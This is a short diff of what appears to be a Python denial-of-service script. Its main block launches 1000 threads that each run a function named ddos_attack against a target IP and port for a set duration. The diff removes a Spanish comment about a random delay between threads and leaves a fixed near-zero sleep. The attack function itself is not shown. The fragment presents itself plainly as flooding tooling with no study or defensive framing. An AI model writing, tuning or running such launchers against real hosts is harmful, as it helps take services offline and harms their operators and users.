@@ -32,12 +32,12 @@ if __name__ == "__main__":
     threads = []
     for _ in range(1000):
         t = threading.Thread(target=ddos_attack, args=(target_ip, target_port, duration_seconds))
-        # Retraso aleatorio entre 0.1 y 1 segundo antes de iniciar cada hilo
         time.sleep(random.uniform(0.0001, 0.0001))
         t.start()
         threads.append(t)
 
     for t in threads:
         t.join()
+
 
 
